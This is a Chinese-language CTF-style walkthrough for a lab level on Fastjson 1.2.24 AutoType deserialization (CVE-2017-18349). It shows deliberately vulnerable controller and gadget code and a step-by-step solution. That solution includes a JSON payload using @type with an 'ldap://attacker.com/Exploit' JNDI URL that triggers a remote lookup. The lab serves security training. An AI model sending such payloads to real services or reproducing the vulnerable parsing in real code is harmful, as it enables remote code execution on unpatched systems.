# Level 2 — Fastjson反序列化

## 关卡说明

本关模拟用户配置服务，使用 Fastjson 1.2.24 解析用户提交的JSON数据。该版本AutoType默认开启，攻击者可通过 `@type` 字段指定 `FastjsonGadget` 类，利用setter调用链触发JNDI注入。

**目标**：构造包含 `@type` 的恶意JSON，触发Fastjson AutoType RCE，获取 Flag。

## 漏洞原理

### 代码逻辑分析

本关的后端代码位于 `FastjsonController.java`，相关接口：

```
GET  /api/challenge/deser/fastjson/info    — 获取系统信息（含Fastjson版本）
GET  /api/challenge/deser/fastjson/gadget  — 获取Gadget类信息
POST /api/challenge/deser/fastjson/update  — 更新配置（漏洞入口）
```

**系统信息**：

| 组件 | 版本 |
|------|------|
| Fastjson | 1.2.24（AutoType默认开启） |
| Spring Boot | 2.3.4 |
| Java | 1.8.0_181 |

**Gadget类信息**：

| 属性 | 值 |
|------|-----|
| 类名 | `com.madrabbit.challenge.deser.FastjsonGadget` |
| 字段 | `dataSourceName` (String), `autoCommit` (boolean) |
| 触发条件 | `autoCommit=true` 且 `dataSourceName` 非空 |
| 触发行为 | `setAutoCommit(true)` → JNDI lookup |

**数据流**：

```
用户提交JSON字符串
    ↓
JSON.parseObject(rawBody)  ← AutoType默认开启！
    ↓
解析到 @type 字段 → 实例化 FastjsonGadget
    ↓
自动调用 setDataSourceName("ldap://attacker/Exploit")
    ↓
自动调用 setAutoCommit(true)
    ↓
setAutoCommit() 检测到 dataSourceName 非空 → JNDI lookup
    ↓
JNDI lookup 触发 → 检测到 gadget 执行 → 返回 Flag
```

**漏洞点**：

1. **Fastjson 1.2.24 AutoType默认开启**：`JSON.parseObject()` 会处理 `@type` 字段。
2. **Gadget Chain**：`FastjsonGadget.setAutoCommit(true)` 在 `dataSourceName` 非空时执行JNDI lookup。
3. **JNDI注入**：lookup可以加载远程恶意类，实现RCE。

### 源码关键片段

```java
// FastjsonController.java — 漏洞核心
Object parsed = JSON.parseObject(rawBody);  // AutoType默认开启
String executionResult = FastjsonGadget.getAndClearResult();
if (executionResult != null) {
    String flag = flagService.getFlag("deserialization", "level2");
    result.put("rce_triggered", true);
    result.put("flag", flag);
}

// FastjsonGadget.java — Gadget Chain
public void setAutoCommit(boolean auto) {
    if (auto && dataSourceName != null && !dataSourceName.isEmpty()) {
        executionResult.set("JNDI lookup executed: " + dataSourceName);
        Context ctx = new InitialContext();
        ctx.lookup(dataSourceName);  // JNDI注入！
    }
}
```

## 通关步骤

### Step 1：获取系统信息

```
GET /api/challenge/deser/fastjson/info
```

确认 Fastjson 版本为 1.2.24。

### Step 2：获取Gadget类信息

```
GET /api/challenge/deser/fastjson/gadget
```

了解 `FastjsonGadget` 的字段和触发条件。

### Step 3：构造恶意JSON

```json
POST /api/challenge/deser/fastjson/update
Content-Type: application/json

{
  "@type": "com.madrabbit.challenge.deser.FastjsonGadget",
  "dataSourceName": "ldap://attacker.com/Exploit",
  "autoCommit": true
}
```

### Step 4：获取 Flag

Fastjson AutoType RCE触发成功后，响应中包含 Flag：

```json
{
  "success": true,
  "rce_triggered": true,
  "vulnerability": "Fastjson 1.2.24 AutoType deserialization (CVE-2017-18349)",
  "flag": "flag{...}"
}
```

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/deserialization/FastjsonController.java` | 后端Fastjson解析接口 |
| `challenge/deser/FastjsonGadget.java` | Gadget Chain类 |
| `service/FlagService.java` | Flag 获取与验证 |
